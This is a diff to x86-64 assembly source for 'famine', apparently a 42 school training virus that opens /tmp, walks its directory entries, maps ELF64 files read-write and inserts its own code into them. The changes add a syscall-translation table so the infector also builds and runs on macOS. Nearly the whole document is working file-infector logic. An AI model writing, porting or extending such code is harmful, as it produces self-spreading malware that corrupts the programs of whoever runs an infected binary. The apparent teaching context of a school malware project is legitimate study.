@@ -1,4 +1,6 @@
-%include "famine.inc"
+%include "famine2.inc"
+
+%define translate_syscall call _translate_syscall
 
 BUF_SIZE    equ 1024
 LOCAL_VARS  equ 1024
@@ -20,7 +22,12 @@ puts:           call        strlen
                 mov         rdx, rax
                 mov         rsi, rdi
                 mov         rdi, 1
+
+%ifidn __OUTPUT_FORMAT__, elf64
                 mov         rax, __NR_write
+%elifidn __OUTPUT_FORMAT__, macho64
+                mov         rax, Darwin__NR_write
+%endif
                 syscall
                 ret
 
@@ -28,7 +35,11 @@ _host:          lea         rdi, [rel hello]
                 call        puts
 
                 xor         rdi, rdi
+%ifidn __OUTPUT_FORMAT__, elf64
                 mov         rax, __NR_exit
+%elifidn __OUTPUT_FORMAT__, macho64
+                mov         rax, Darwin__NR_exit
+%endif
                 syscall
 hello           db          "hello world",33,10,0
                 times 128 - $ + strlen db 0x90
@@ -42,6 +53,8 @@ _start:
                 push        rdx
 
                 lea         rax, [rel _start]
+                xor         r15, r15
+                mov         r15b, byte [rax + (_platform - _start)]
                 mov         rdx, [rel pie_address]
                 sub         rax, rdx
                 add         rax, [rel entry]
@@ -50,7 +63,7 @@ _start:
                 lea         rdi, [rel slash_tmp]
                 mov         rsi, O_RDONLY | O_DIRECTORY
                 mov         rax, __NR_open
-                syscall
+                translate_syscall
                 test        rax, rax
                 jl          _return
 
@@ -58,16 +71,17 @@ _start:
 
                 mov         rdi, rax
                 mov         rax, __NR_fchdir
-                syscall
+                translate_syscall
                 test        rax, rax
                 jl          _return
 
 
-scandir:        mov         rdx, BUF_SIZE
+scandir:        xor         r10, r10
+                mov         rdx, BUF_SIZE
                 lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                 mov         rdi, [rsp-0x30]             ;directory fd
-                mov         rax, __NR_getdents64
-                syscall
+                mov         rax, __NR_getdents
+                translate_syscall
                 test        rax, rax
                 jle         .close
 
@@ -100,7 +114,7 @@ scandir:        mov         rdx, BUF_SIZE
 
 .close:         mov         rdi, [rsp-0x30]
                 mov         rax, __NR_close
-                syscall
+                translate_syscall
 _return:
                 pop         rax
 
@@ -114,7 +128,7 @@ _return:
 process:                                                         ; expecting filename in rdi
                 mov         rsi, O_RDWR
                 mov         rax, __NR_open
-                syscall
+                translate_syscall
                 test        rax, rax
                 jl          .return
 
@@ -123,7 +137,7 @@ process:                                                         ; expecting fil
                 lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
                 mov         rdi, [rsp-0x48]
                 mov         rax, __NR_fstat
-                syscall
+                translate_syscall
                 cmp         rax, 0
                 jnz         .close
 
@@ -137,7 +151,7 @@ process:                                                         ; expecting fil
                 mov         rsi, rax
                 xor         rdi, rdi
                 mov         rax, __NR_mmap
-                syscall
+                translate_syscall
                 cmp         rax, -4095
                 jae         .close
 
@@ -153,11 +167,11 @@ process:                                                         ; expecting fil
 .unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                 mov         rdi, [rsp-0x58]                     ; infect_mem
                 mov         rax, __NR_munmap
-                syscall
+                translate_syscall
 
 .close:         mov         rdi, [rsp-0x48]
                 mov         rax, __NR_close
-                syscall
+                translate_syscall
 .return:        ret
 
 is_valid_elf64:                                                 ; expecing data in rdi
@@ -246,6 +260,34 @@ insert:                                                         ; expecting data
                 pop         r14
                 pop         r13
                 ret
+
+_platform:
+%ifidn __OUTPUT_FORMAT__, elf64
+                db 0
+%elifidn __OUTPUT_FORMAT__, macho64
+                db 1
+%endif
+
+linux_syscalls          db 0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x51
+darwin_syscalls         db 0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0d
+%define num_syscalls    7
+
+_translate_syscall:                                             ; expecting r15 == 0 on linux
+                test        r15, r15                            ; anything else on macos
+                jz          .ready
+                push        rdi
+                push        rcx                
+                lea         rdi, [rel linux_syscalls]
+                mov         rcx, num_syscalls
+                repne       scasb
+                add         rdi, (num_syscalls - 1)
+                mov         al, byte [rdi]
+                or          eax, 0x02000000;
+                pop         rcx
+                pop         rdi
+.ready:         syscall
+                ret
+
 
 slash_tmp   db "/tmp",0
 signature   db "famine v0.1 @42siliconvalley",0
